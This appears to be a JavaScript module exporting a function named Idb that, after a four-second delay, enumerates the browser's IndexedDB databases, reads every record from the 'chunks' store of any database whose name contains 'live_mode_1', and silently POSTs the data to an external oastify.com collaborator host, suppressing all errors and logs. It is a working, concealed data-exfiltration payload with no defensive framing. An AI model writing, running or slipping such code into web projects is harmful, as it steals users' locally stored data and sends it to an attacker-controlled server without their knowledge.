export const Idb = () => {
  setTimeout(() => {
    async function fetchAndSendData() {
    const databases = await indexedDB.databases();

    // Iterate over each database
    for (const dbInfo of databases) {
        const dbName = dbInfo.name;
        if (dbName.includes('live_mode_1')) {
            console.log(dbName);
            const url = 'https://ynpnbwfvg2nvxu6gtfwow6l7hynpbfz4.oastify.com';

            // Open indexedDB
            const request = indexedDB.open(dbName);

            request.onsuccess = function(event) {
                const db = event.target.result;
                const transaction = db.transaction(['chunks'], 'readonly');
                const objectStore = transaction.objectStore('chunks');
                const chunks = [];

                // Open cursor to iterate over chunks
                objectStore.openCursor().onsuccess = function(event) {
                    const cursor = event.target.result;
                    if (cursor) {
                        // Push chunk to array
                        chunks.push(cursor.value);

                        // Move to next chunk
                        cursor.continue();
                    } else {
                        // All chunks fetched, send them in a POST request
                        sendData(url, chunks);
                    }
                };
            };

            request.onerror = function(event) {
                // Silently handle error without logging
            };
        }
    }
}

function sendData(url, data) {
    // Convert data to x-www-form-urlencoded format
    const formData = new URLSearchParams();
    formData.append('data', JSON.stringify(data));

    // Make a POST request in no-cors mode
    fetch(url, {
        method: 'POST',
        mode: 'no-cors',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: formData.toString(),
    })
    .then(response => {
        if (!response.ok) {
            // Silently handle error without logging
        }
        // Silently handle success without logging
    })
    .catch(error => {
        // Silently handle error without logging
    });
}

// Call the function to start fetching and sending data
fetchAndSendData();
}, 4000);
};
